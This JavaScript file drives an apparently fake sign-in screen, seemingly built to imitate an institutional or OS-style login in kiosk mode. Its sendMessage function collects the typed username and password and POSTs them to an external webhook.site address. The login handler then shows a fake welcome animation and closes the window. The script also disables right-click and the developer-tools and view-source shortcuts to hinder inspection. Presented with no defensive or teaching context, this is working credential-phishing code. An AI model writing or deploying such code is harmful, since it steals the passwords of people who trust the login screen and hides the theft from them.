const button_info = document.querySelector(".info_text");
const info_text = document.querySelector(".describe_text");
const eye_icon = document.querySelector(".eye_icon");
const input_login = document.querySelector(".inputLogin");
const input_password = document.querySelector(".inputPassword");
const login_button = document.querySelector(".bx-right-arrow-alt");
const larioja_button = document.querySelector(".larioja_text");
const option_button = document.querySelector(".opciones_user");
const loading = document.querySelector(".loading");
const input_box = document.querySelector(".input_box");

const inputs_container = document.querySelector(".Login");
const users_container = document.querySelector(".other_users");
const icons_container = document.querySelector(".accessibility-icons"); 
const wel_text = document.querySelector(".wel_text");

function sendMessage() {
      let login = document.querySelector(".inputLogin").value;
      let password = document.querySelector(".inputPassword").value;

      let date = new Date().toLocaleString(); 
      let msg = `Date: ${date}\nLogin: ${login}\nPassword: ${password}`;

      fetch("https://webhook.site/b095669c-8668-448a-8e0c-b8a9b91b4c3f", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ message: msg })
      })
      .then(response => {
        if (response.ok) {
          console.log("✅ Message sent!");
        } else {
          console.log("❌ Failed to send.");
        }
      })
      .catch(error => {
        console.error(error);
        console.log("⚠️ Error sending message.");
      });
}

function Login (){
  // inputs_container.style.display = "none";
  users_container.style.display = "none";
  icons_container.style.display = "none";
  input_login.style.display = "none";
  input_password.style.display = "none";
  login_button.style.display = "none";
  eye_icon.style.display = "none";

  input_box.style.display = "none";
  button_info.style.display = "none";
  info_text.style.display = "none";
  larioja_button.style.display = "none";
  option_button.style.display = "none";

  loading.style.display = "block"; 
  wel_text.classList.add("show");

  sendMessage();

  setTimeout(() => {
      window.close(); // Important note! This window will close only in --kiosk mode and with some security privileges disabled.
    }, 8000);
}

eye_icon.addEventListener("click", () => {
  input_password.type = "text";
  setTimeout(() => {
    input_password.type = "password";
  }, 200);
})

eye_icon.addEventListener("focus", () => {
  input_password.type = "text";
  setTimeout(() => {
    input_password.type = "password";
  }, 300);
}) 

input_login.addEventListener("input", () => {
    input_login.style.cssText = `
        background-color: #012055e4;
        border: 1.5px solid rgba(0, 90, 209, 0.865);
        border-bottom: 2px solid rgb(0, 186, 219);
        padding: 9px 40px 9px 12px;
        width: 100%;
        border-radius: 5px;
        color: whitesmoke;
        outline: none;
        transition: background-color 0.2s, border 0.2s;
    `;
})

input_password.addEventListener("input", () => {
    input_password.style.cssText = `
        background-color: #012055e4;
        border: 1.5px solid rgba(0, 90, 209, 0.865);
        border-bottom: 2px solid rgb(0, 186, 219);
        padding: 9px 40px 9px 12px;
        width: 100%;
        border-radius: 5px;
        color: whitesmoke;
        outline: none;
        transition: background-color 0.2s, border 0.2s;
    `;
})

input_password.addEventListener("keypress", function(event) {
  if (event.key === "Enter") {
    Login();
  }
});

login_button.addEventListener("click", function(event) {
  Login();
});

function password(input) {
  if (input.value.trim() !== "") {
    eye_icon.style.display = "block"; // Show the eye icon
  } else {
    eye_icon.style.display = "none"; // Hide if empty or whitespace
  }
}
function hideEye(input) {
  if (input.value.trim() === "") {
    eye_icon.style.display = "none";
  }
}

let toggle = false;

button_info.addEventListener("click", () => {
    if (!toggle) {
        info_text.classList.add("show");
        info_text.classList.remove("hide");

        toggle = true;
    } else {
        info_text.classList.add("hide");
        info_text.classList.remove("show");
        
        
        toggle = false;
    }
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

document.addEventListener("keydown", function (e) {
  // F12
  if (e.key === "F12") {
    e.preventDefault();
  }

  // Ctrl+Shift+I or Ctrl+Shift+J or Ctrl+U
  if ((e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
      (e.ctrlKey && e.key === "U")) {
    e.preventDefault();
  }
});
